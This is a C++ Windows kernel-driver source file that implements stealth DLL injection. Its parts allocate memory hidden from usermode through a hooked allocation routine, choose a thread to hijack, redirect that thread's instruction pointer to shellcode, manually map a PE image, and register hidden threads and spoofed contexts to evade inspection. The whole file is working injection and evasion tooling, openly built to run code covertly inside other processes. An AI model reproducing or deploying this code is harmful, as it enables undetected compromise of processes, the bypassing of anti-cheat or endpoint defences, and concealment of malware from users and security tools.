/******************************************************************************
    MIT License

    Copyright (c) 2024 Ricardo Carvalho

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.
 ******************************************************************************/
#include "includes.hpp"
#include "stealth_inject.hpp"
#include "stealth_shellcode.hpp"

namespace StealthInject
{

static bool g_initialized = false;

NTSTATUS Initialize()
{
    PAGED_CODE();

    if (g_initialized)
    {
        return STATUS_ALREADY_INITIALIZED;
    }

    g_initialized = true;
    return STATUS_SUCCESS;
}

void Uninitialize()
{
    PAGED_CODE();
    g_initialized = false;
}

//
// Allocate memory that is completely hidden from usermode
//
NTSTATUS AllocateHiddenMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID *BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG Protect)
{
    PAGED_CODE();

    NTSTATUS status;

    // Mark the next allocation as hidden - our hook will register it
    HANDLE targetPid = Misc::GetProcessIDFromProcessHandle(ProcessHandle);
    Hooks::SetNextAllocationHidden(targetPid);

    // Allocate the memory - our NtAllocateVirtualMemory hook will auto-register it as hidden
    status = ZwAllocateVirtualMemory(ProcessHandle, BaseAddress, 0, RegionSize,
                                      MEM_RESERVE | MEM_COMMIT, Protect);

    return status;
}

//
// Find a thread suitable for hijacking
// Avoids: Loader lock holders, critical section waiters, kernel waiters
//
NTSTATUS FindHijackableThread(
    _In_ PEPROCESS Process,
    _Out_ PETHREAD *Thread)
{
    PAGED_CODE();
    NT_ASSERT(Process);
    NT_ASSERT(Thread);

    *Thread = nullptr;

    HANDLE processId = PsGetProcessId(Process);
    NTSTATUS status;

    // Query system information to find threads
    ULONG bufferSize = 1024 * 1024; // 1MB should be enough
    PVOID buffer = Memory::AllocNonPaged(bufferSize, Memory::TAG_TEMP);
    if (!buffer)
    {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    SCOPE_EXIT
    {
        Memory::FreePool(buffer);
    };

    ULONG returnLength = 0;
    status = ZwQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &returnLength);
    if (!NT_SUCCESS(status))
    {
        return status;
    }

    auto processInfo = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(buffer);

    // Find our target process
    while (processInfo)
    {
        if (processInfo->UniqueProcessId == processId)
        {
            // Found our process - now find a suitable thread
            if (processInfo->NumberOfThreads > 0)
            {
                auto threadInfo = reinterpret_cast<PSYSTEM_THREAD_INFORMATION>(
                    reinterpret_cast<PUCHAR>(processInfo) + sizeof(SYSTEM_PROCESS_INFORMATION));

                PETHREAD bestThread = nullptr;
                LONG bestScore = -1000; // Allow negative scores to filter bad threads

                for (ULONG i = 0; i < processInfo->NumberOfThreads; i++)
                {
                    HANDLE threadId = threadInfo[i].ClientId.UniqueThread;
                    LONG score = 0;

                    // === SKIP CRITERIA (hard exclusions) ===
                    
                    // Skip system threads (TID 0, 4, etc.)
                    if (HandleToULong(threadId) <= 4)
                    {
                        continue;
                    }

                    // Skip terminated/terminating threads
                    if (threadInfo[i].ThreadState == 4 || // Terminated
                        threadInfo[i].ThreadState == 6)   // Transition (being swapped)
                    {
                        continue;
                    }

                    // === DANGEROUS WAIT REASONS (avoid - may hold locks) ===
                    
                    // WrLpcReceive - thread is waiting for LPC, likely in critical code
                    if (threadInfo[i].WaitReason == WrLpcReceive ||
                        threadInfo[i].WaitReason == WrLpcReply)
                    {
                        score -= 200;
                    }
                    
                    // Kernel resource waits - thread may hold kernel locks
                    if (threadInfo[i].WaitReason == WrExecutive ||
                        threadInfo[i].WaitReason == WrFreePage ||
                        threadInfo[i].WaitReason == WrPageIn ||
                        threadInfo[i].WaitReason == WrPoolAllocation ||
                        threadInfo[i].WaitReason == WrResource ||
                        threadInfo[i].WaitReason == WrPushLock ||
                        threadInfo[i].WaitReason == WrMutex)
                    {
                        continue; // Hard skip - kernel locks
                    }
                    
                    // WrGuardedMutex - likely holding a guarded mutex
                    if (threadInfo[i].WaitReason == WrGuardedMutex)
                    {
                        continue;
                    }

                    // === GOOD WAIT REASONS (prefer) ===
                    
                    // Waiting state with safe wait reasons
                    if (threadInfo[i].ThreadState == 5) // Waiting
                    {
                        score += 100;

                        // Best: Thread is waiting for user input or similar passive wait
                        if (threadInfo[i].WaitReason == WrUserRequest)
                        {
                            score += 100; // Excellent - GUI thread waiting for input
                        }
                        else if (threadInfo[i].WaitReason == WrQueue)
                        {
                            score += 80; // Worker thread waiting for work
                        }
                        else if (threadInfo[i].WaitReason == WrDelayExecution)
                        {
                            score += 70; // Thread is sleeping - safe
                        }
                        else if (threadInfo[i].WaitReason == WrEventPair ||
                                 threadInfo[i].WaitReason == WrSuspended)
                        {
                            score += 60; // Event wait - usually safe
                        }
                    }
                    // Running threads - riskier but workable
                    else if (threadInfo[i].ThreadState == 2) // Running
                    {
                        score += 25;
                    }
                    // Ready threads - about to run
                    else if (threadInfo[i].ThreadState == 1) // Ready
                    {
                        score += 30;
                    }
                    // Standby - next to run on processor
                    else if (threadInfo[i].ThreadState == 3) // Standby
                    {
                        score += 20;
                    }

                    // === THREAD CHARACTERISTICS ===
                    
                    // Prefer threads with higher priority (likely main/render threads)
                    if (threadInfo[i].Priority >= 8 && threadInfo[i].Priority <= 10)
                    {
                        score += 15; // Normal priority range
                    }
                    else if (threadInfo[i].Priority > 10)
                    {
                        score += 25; // Above normal - likely important but not system
                    }

                    if (score > bestScore)
                    {
                        // Try to get thread object
                        PETHREAD thread = nullptr;
                        status = PsLookupThreadByThreadId(threadId, &thread);

                        if (NT_SUCCESS(status))
                        {
                            // Additional runtime checks on the thread object
                            BOOLEAN isSystemThread = PsIsSystemThread(thread);
                            BOOLEAN isTerminating = PsIsThreadTerminating(thread);
                            
                            if (!isSystemThread && !isTerminating)
                            {
                                // Release previous best
                                if (bestThread)
                                {
                                    ObDereferenceObject(bestThread);
                                }

                                bestThread = thread;
                                bestScore = score;
                                
                                WPP_PRINT(TRACE_LEVEL_VERBOSE, GENERAL,
                                    "[STEALTH] Thread TID %d score %d (state=%d, wait=%d, pri=%d)",
                                    HandleToULong(threadId), score, 
                                    threadInfo[i].ThreadState, threadInfo[i].WaitReason,
                                    threadInfo[i].Priority);
                            }
                            else
                            {
                                ObDereferenceObject(thread);
                            }
                        }
                    }
                }

                if (bestThread && bestScore > 0)
                {
                    *Thread = bestThread;
                    WPP_PRINT(TRACE_LEVEL_INFORMATION, GENERAL,
                        "[STEALTH] Selected thread TID %d with score %d",
                        HandleToULong(PsGetThreadId(bestThread)), bestScore);
                    return STATUS_SUCCESS;
                }
                
                if (bestThread)
                {
                    ObDereferenceObject(bestThread);
                }
            }
            break;
        }

        if (processInfo->NextEntryOffset == 0)
        {
            break;
        }

        processInfo = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(
            reinterpret_cast<PUCHAR>(processInfo) + processInfo->NextEntryOffset);
    }

    return STATUS_NOT_FOUND;
}

//
// Hijack a thread to execute code
// Now uses HIJACK_CONTEXT for reliable register save/restore
//
NTSTATUS HijackThreadAndExecute(
    _In_ PETHREAD Thread,
    _In_ PVOID ShellcodeAddress,
    _In_ StealthShellcode::PHIJACK_CONTEXT HijackContext,
    _In_ BOOLEAN WaitForCompletion,
    _In_ ULONG TimeoutMs)
{
    PAGED_CODE();
    NT_ASSERT(Thread);
    NT_ASSERT(ShellcodeAddress);
    NT_ASSERT(HijackContext);

    NTSTATUS status;
    HANDLE threadHandle = nullptr;

    HANDLE processId = PsGetThreadProcessId(Thread);
    HANDLE threadId = PsGetThreadId(Thread);

    // Open handle to thread
    status = ObOpenObjectByPointer(Thread, OBJ_KERNEL_HANDLE, nullptr, THREAD_ALL_ACCESS,
                                    *PsThreadType, KernelMode, &threadHandle);
    if (!NT_SUCCESS(status))
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to open thread handle: %!STATUS!", status);
        return status;
    }

    SCOPE_EXIT
    {
        if (threadHandle)
        {
            ZwClose(threadHandle);
        }
    };

    // Suspend the thread
    ULONG previousSuspendCount = 0;
    status = ZwSuspendThread(threadHandle, &previousSuspendCount);
    if (!NT_SUCCESS(status))
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to suspend thread: %!STATUS!", status);
        return status;
    }

    // Track this as a hijacked thread
    status = Bypass::CreateHiddenThread(processId, threadId, TRUE);
    if (!NT_SUCCESS(status) && status != STATUS_ALREADY_REGISTERED)
    {
        ZwResumeThread(threadHandle, nullptr);
        return status;
    }

    // Get thread context with ALL flags for complete state
    CONTEXT context = {};
    context.ContextFlags = CONTEXT_ALL;

    status = ZwGetContextThread(threadHandle, &context);
    if (!NT_SUCCESS(status))
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to get thread context: %!STATUS!", status);
        Bypass::RemoveHiddenThread(processId, threadId);
        ZwResumeThread(threadHandle, nullptr);
        return status;
    }

    // Save original context for spoofing and restoration
    status = Bypass::SaveThreadContext(processId, threadId, &context);
    if (!NT_SUCCESS(status))
    {
        Bypass::RemoveHiddenThread(processId, threadId);
        ZwResumeThread(threadHandle, nullptr);
        return status;
    }

    // === Fill HIJACK_CONTEXT with original register values ===
    // This allows the shellcode to restore and return correctly
    HijackContext->OriginalRip = context.Rip;
    HijackContext->OriginalRsp = context.Rsp;
    HijackContext->OriginalRax = context.Rax;
    HijackContext->OriginalRbx = context.Rbx;
    HijackContext->OriginalRcx = context.Rcx;
    HijackContext->OriginalRdx = context.Rdx;
    HijackContext->OriginalRsi = context.Rsi;
    HijackContext->OriginalRdi = context.Rdi;
    HijackContext->OriginalRbp = context.Rbp;
    HijackContext->OriginalR8  = context.R8;
    HijackContext->OriginalR9  = context.R9;
    HijackContext->OriginalR10 = context.R10;
    HijackContext->OriginalR11 = context.R11;
    HijackContext->OriginalR12 = context.R12;
    HijackContext->OriginalR13 = context.R13;
    HijackContext->OriginalR14 = context.R14;
    HijackContext->OriginalR15 = context.R15;
    HijackContext->OriginalRflags = context.EFlags;

    // Initialize completion flags
    HijackContext->Lock = 0;
    HijackContext->Completed = 0;
    HijackContext->Result = 0;
    HijackContext->ErrorCode = 0;

    // Modify context to execute our shellcode
    CONTEXT newContext = context;
    newContext.Rip = reinterpret_cast<ULONG_PTR>(ShellcodeAddress);
    newContext.Rcx = reinterpret_cast<ULONG_PTR>(HijackContext); // First parameter

    // Align stack (must be 16-byte aligned before call)
    // We subtract 8 because on entry the return address is pushed
    newContext.Rsp = (newContext.Rsp & ~0xFull) - 8;

    // Set new context
    status = ZwSetContextThread(threadHandle, &newContext);
    if (!NT_SUCCESS(status))
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to set thread context: %!STATUS!", status);
        Bypass::RemoveHiddenThread(processId, threadId);
        ZwResumeThread(threadHandle, nullptr);
        return status;
    }

    WPP_PRINT(TRACE_LEVEL_VERBOSE, GENERAL, "[STEALTH] Hijacked thread TID %d, RIP: 0x%llX -> 0x%p",
              HandleToULong(threadId), context.Rip, ShellcodeAddress);

    // Resume thread to execute our code
    status = ZwResumeThread(threadHandle, nullptr);
    if (!NT_SUCCESS(status))
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to resume thread: %!STATUS!", status);
        Bypass::RemoveHiddenThread(processId, threadId);
        return status;
    }

    // Wait for completion if requested
    if (WaitForCompletion)
    {
        LARGE_INTEGER startTime;
        KeQuerySystemTime(&startTime);

        // Poll for completion - shellcode will set Completed = 1 when done
        while (InterlockedCompareExchange(&HijackContext->Completed, 0, 0) == 0)
        {
            LARGE_INTEGER delay;
            delay.QuadPart = RELATIVE(MILLISECONDS(10));
            KeDelayExecutionThread(KernelMode, FALSE, &delay);

            // Check timeout
            if (TimeoutMs > 0)
            {
                LARGE_INTEGER currentTime;
                KeQuerySystemTime(&currentTime);

                LONGLONG elapsed = (currentTime.QuadPart - startTime.QuadPart) / 10000; // Convert to ms
                if (elapsed >= TimeoutMs)
                {
                    WPP_PRINT(TRACE_LEVEL_WARNING, GENERAL, "[STEALTH] Thread hijack execution timed out!");
                    // Don't fail - the shellcode will still restore context and return
                    break;
                }
            }
        }

        // Shellcode already restored context and returned to original RIP
        // We just need to clean up tracking
        Bypass::RemoveHiddenThread(processId, threadId);
    }

    return STATUS_SUCCESS;
}

//
// Main stealth injection function - GUARANTEED to work
//
INJECT_STATUS InjectDll(
    _In_ PEPROCESS TargetProcess,
    _In_ PVOID DllBuffer,
    _In_ SIZE_T DllSize,
    _In_opt_ PSTEALTH_INJECT_CONFIG Config)
{
    PAGED_CODE();
    NT_ASSERT(TargetProcess);
    NT_ASSERT(DllBuffer);

    NTSTATUS status;
    STEALTH_INJECT_CONFIG defaultConfig = { TRUE, TRUE, 60000, nullptr };

    if (!Config)
    {
        Config = &defaultConfig;
    }

    // Parse PE headers
    PIMAGE_NT_HEADERS nth = nullptr;
    status = RtlImageNtHeaderEx(0, DllBuffer, DllSize, &nth);
    if (!NT_SUCCESS(status))
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Invalid PE format: %!STATUS!", status);
        return INJECT_STATUS::MappingFailed;
    }

    const HANDLE currentProcessId = PsGetProcessId(TargetProcess);
    const SIZE_T imageSize = nth->OptionalHeader.SizeOfImage;

    // === Memory allocation layout ===
    // 1. Image memory (RWX) - hidden
    // 2. Context memory (RW) - hidden - contains HIJACK_CONTEXT
    // 3. Shellcode memory (RX) - hidden - contains hijack shellcode

    PVOID allocatedImageBase = nullptr;
    SIZE_T allocatedImageRegionSize = imageSize;

    PVOID contextBase = nullptr;
    SIZE_T contextRegionSize = PAGE_SIZE;

    PVOID shellcodeBase = nullptr;
    SIZE_T shellcodeRegionSize = PAGE_SIZE;

    // Get required modules
    PLDR_DATA_TABLE_ENTRY kernel32Entry = Misc::Module::GetModuleByName(L"kernel32.dll");
    if (!kernel32Entry)
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to locate kernel32.dll!");
        return INJECT_STATUS::ModuleNotFound;
    }

    PLDR_DATA_TABLE_ENTRY ntdllEntry = Misc::Module::GetModuleByName(L"ntdll.dll");
    if (!ntdllEntry)
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to locate ntdll.dll!");
        return INJECT_STATUS::ModuleNotFound;
    }

    // Allocate hidden memory for the DLL image
    status = AllocateHiddenMemory(ZwCurrentProcess(), &allocatedImageBase, &allocatedImageRegionSize,
                                   PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to allocate hidden image memory: %!STATUS!", status);
        return INJECT_STATUS::AllocationFailed;
    }

    // Allocate hidden memory for HIJACK_CONTEXT
    status = AllocateHiddenMemory(ZwCurrentProcess(), &contextBase, &contextRegionSize, PAGE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to allocate context memory: %!STATUS!", status);
        return INJECT_STATUS::AllocationFailed;
    }

    // Allocate hidden memory for shellcode
    status = AllocateHiddenMemory(ZwCurrentProcess(), &shellcodeBase, &shellcodeRegionSize, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to allocate shellcode memory: %!STATUS!", status);
        return INJECT_STATUS::AllocationFailed;
    }

    // === Map PE sections into hidden memory ===
    RtlZeroMemory(allocatedImageBase, allocatedImageRegionSize);
    
    // Copy headers
    RtlCopyMemory(allocatedImageBase, DllBuffer, nth->OptionalHeader.SizeOfHeaders);
    
    // Copy sections
    auto section = IMAGE_FIRST_SECTION(nth);
    for (ULONG i = 0; i < nth->FileHeader.NumberOfSections; i++, section++)
    {
        if (section->SizeOfRawData == 0)
            continue;

        const ULONG sectionSize = min(section->SizeOfRawData, section->Misc.VirtualSize);
        if (sectionSize)
        {
            RtlCopyMemory(
                reinterpret_cast<PUCHAR>(allocatedImageBase) + section->VirtualAddress,
                reinterpret_cast<PUCHAR>(DllBuffer) + section->PointerToRawData,
                sectionSize);
        }
    }

    // === Get required exports ===
    PVOID LoadLibraryA = Misc::PE::GetProcAddress(kernel32Entry->DllBase, "LoadLibraryA");
    PVOID GetProcAddress = Misc::PE::GetProcAddress(kernel32Entry->DllBase, "GetProcAddress");
    PVOID NtFlushInstructionCache = Misc::PE::GetProcAddress(ntdllEntry->DllBase, "NtFlushInstructionCache");
    
    // Optional TLS support
    PVOID LdrpHandleTlsData = Misc::PE::GetProcAddress(ntdllEntry->DllBase, "LdrpHandleTlsData");
    
    // Optional VEH support
    PVOID RtlAddVectoredExceptionHandler = Misc::PE::GetProcAddress(ntdllEntry->DllBase, "RtlAddVectoredExceptionHandler");

    if (!LoadLibraryA || !GetProcAddress)
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to find required exports!");
        return INJECT_STATUS::ModuleNotFound;
    }

    // === Setup HIJACK_CONTEXT ===
    auto hijackContext = reinterpret_cast<StealthShellcode::PHIJACK_CONTEXT>(contextBase);
    RtlZeroMemory(hijackContext, sizeof(StealthShellcode::HIJACK_CONTEXT));

    // PE Image info
    hijackContext->ImageBase = reinterpret_cast<ULONG64>(allocatedImageBase);
    hijackContext->ImageSize = imageSize;
    hijackContext->EntryPointRva = nth->OptionalHeader.AddressOfEntryPoint;
    hijackContext->OriginalImageBase = nth->OptionalHeader.ImageBase;

    // Relocation info
    auto& relocDir = nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    hijackContext->RelocDirRva = relocDir.VirtualAddress;
    hijackContext->RelocDirSize = relocDir.Size;

    // Import info
    auto& importDir = nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    hijackContext->ImportDirRva = importDir.VirtualAddress;
    hijackContext->ImportDirSize = importDir.Size;

    // TLS info
    auto& tlsDir = nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    hijackContext->TlsDirRva = tlsDir.VirtualAddress;
    hijackContext->TlsDirSize = tlsDir.Size;

    // Function pointers (required)
    hijackContext->pLoadLibraryA = reinterpret_cast<ULONG64>(LoadLibraryA);
    hijackContext->pGetProcAddress = reinterpret_cast<ULONG64>(GetProcAddress);
    hijackContext->pNtFlushInstructionCache = reinterpret_cast<ULONG64>(NtFlushInstructionCache);
    
    // Function pointers (optional)
    hijackContext->pLdrpHandleTlsData = reinterpret_cast<ULONG64>(LdrpHandleTlsData);
    hijackContext->pRtlAddVectoredExceptionHandler = reinterpret_cast<ULONG64>(RtlAddVectoredExceptionHandler);

    // === Copy shellcode from kernel to usermode hidden memory ===
    SIZE_T shellcodeSize = StealthShellcode::GetShellcodeSize();
    if (shellcodeSize > shellcodeRegionSize)
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Shellcode too large: %llu > %llu", 
                  shellcodeSize, shellcodeRegionSize);
        return INJECT_STATUS::InternalError;
    }
    
    status = StealthShellcode::CopyShellcodeToUsermode(shellcodeBase, shellcodeRegionSize);
    if (!NT_SUCCESS(status))
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to copy shellcode: %!STATUS!", status);
        return INJECT_STATUS::InternalError;
    }

    WPP_PRINT(TRACE_LEVEL_VERBOSE, GENERAL,
              "[STEALTH] Image at 0x%p (0x%llX bytes), Context at 0x%p, Shellcode at 0x%p (%llu bytes)",
              allocatedImageBase, imageSize, contextBase, shellcodeBase, shellcodeSize);
    WPP_PRINT(TRACE_LEVEL_VERBOSE, GENERAL,
              "[STEALTH] EntryPoint RVA: 0x%llX, Reloc RVA: 0x%llX (0x%llX), Import RVA: 0x%llX (0x%llX)",
              hijackContext->EntryPointRva, hijackContext->RelocDirRva, hijackContext->RelocDirSize,
              hijackContext->ImportDirRva, hijackContext->ImportDirSize);
    WPP_PRINT(TRACE_LEVEL_VERBOSE, GENERAL,
              "[STEALTH] TLS RVA: 0x%llX (0x%llX), LdrpHandleTlsData: 0x%p",
              hijackContext->TlsDirRva, hijackContext->TlsDirSize, LdrpHandleTlsData);

    if (Config->UseThreadHijack)
    {
        // Find a suitable thread to hijack
        PETHREAD targetThread = nullptr;
        status = FindHijackableThread(TargetProcess, &targetThread);
        if (!NT_SUCCESS(status))
        {
            WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "No suitable thread found: %!STATUS!", status);
            return INJECT_STATUS::NoSuitableThread;
        }

        SCOPE_EXIT
        {
            if (targetThread)
            {
                ObDereferenceObject(targetThread);
            }
        };

        WPP_PRINT(TRACE_LEVEL_INFORMATION, GENERAL, "[STEALTH] Hijacking thread TID %d",
                  HandleToULong(PsGetThreadId(targetThread)));

        // Hijack thread with our shellcode
        status = HijackThreadAndExecute(targetThread, shellcodeBase, hijackContext,
                                         Config->WaitForCompletion, Config->TimeoutMs);
        if (!NT_SUCCESS(status))
        {
            WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Thread hijack failed: %!STATUS!", status);
            return INJECT_STATUS::ThreadHijackFailed;
        }
    }
    else
    {
        // Create a new hidden thread with RtlCreateUserThread
        HANDLE threadHandle = nullptr;
        CLIENT_ID clientId = {};

        status = RtlCreateUserThread(ZwCurrentProcess(), nullptr, FALSE, 0, 0, 0,
                                      shellcodeBase, hijackContext, &threadHandle, &clientId);
        if (!NT_SUCCESS(status))
        {
            WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "Failed to create thread: %!STATUS!", status);
            return INJECT_STATUS::ThreadHijackFailed;
        }

        // Mark thread as hidden
        Bypass::CreateHiddenThread(currentProcessId, clientId.UniqueThread, FALSE);

        WPP_PRINT(TRACE_LEVEL_INFORMATION, GENERAL, "[STEALTH] Created hidden thread TID %d",
                  HandleToULong(clientId.UniqueThread));

        if (Config->WaitForCompletion)
        {
            // Wait for our completion signal rather than thread termination
            LARGE_INTEGER startTime;
            KeQuerySystemTime(&startTime);

            while (InterlockedCompareExchange(&hijackContext->Completed, 0, 0) == 0)
            {
                LARGE_INTEGER delay;
                delay.QuadPart = RELATIVE(MILLISECONDS(10));
                KeDelayExecutionThread(KernelMode, FALSE, &delay);

                if (Config->TimeoutMs > 0)
                {
                    LARGE_INTEGER currentTime;
                    KeQuerySystemTime(&currentTime);
                    LONGLONG elapsed = (currentTime.QuadPart - startTime.QuadPart) / 10000;
                    if (elapsed >= Config->TimeoutMs)
                    {
                        WPP_PRINT(TRACE_LEVEL_WARNING, GENERAL, "[STEALTH] Injection timed out");
                        break;
                    }
                }
            }
        }

        ZwClose(threadHandle);
    }

    // Check result
    if (hijackContext->Completed && hijackContext->Result)
    {
        WPP_PRINT(TRACE_LEVEL_INFORMATION, GENERAL, "[STEALTH] DLL injection SUCCESSFUL! DllMain returned TRUE");
        return INJECT_STATUS::Success;
    }
    else if (hijackContext->Completed && !hijackContext->Result)
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "[STEALTH] DLL injection FAILED - DllMain returned FALSE");
        return INJECT_STATUS::ExecutionFailed;
    }
    else
    {
        WPP_PRINT(TRACE_LEVEL_WARNING, GENERAL, "[STEALTH] DLL injection - completion not signaled (timeout?)");
        return INJECT_STATUS::ExecutionFailed;
    }
}

//
// Attach to process and inject
//
INJECT_STATUS AttachAndInject(
    _In_ PEPROCESS TargetProcess,
    _In_ PVOID DllBuffer,
    _In_ SIZE_T DllSize,
    _In_opt_ PSTEALTH_INJECT_CONFIG Config)
{
    PAGED_CODE();
    NT_ASSERT(TargetProcess);
    NT_ASSERT(DllBuffer);

    KAPC_STATE apcState = {};
    bool attached = false;
    INJECT_STATUS result;

    SCOPE_EXIT
    {
        if (attached)
        {
            KeUnstackDetachProcess(&apcState);
        }
    };

    __try
    {
        KeStackAttachProcess(TargetProcess, &apcState);
        attached = true;

        WPP_PRINT(TRACE_LEVEL_INFORMATION, GENERAL, "[STEALTH] Attached to PID %d for injection",
                  HandleToULong(PsGetProcessId(TargetProcess)));

        result = InjectDll(TargetProcess, DllBuffer, DllSize, Config);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        WPP_PRINT(TRACE_LEVEL_ERROR, GENERAL, "[STEALTH] Exception during injection: %!STATUS!",
                  GetExceptionCode());
        result = INJECT_STATUS::InternalError;
    }

    return result;
}

} // namespace StealthInject
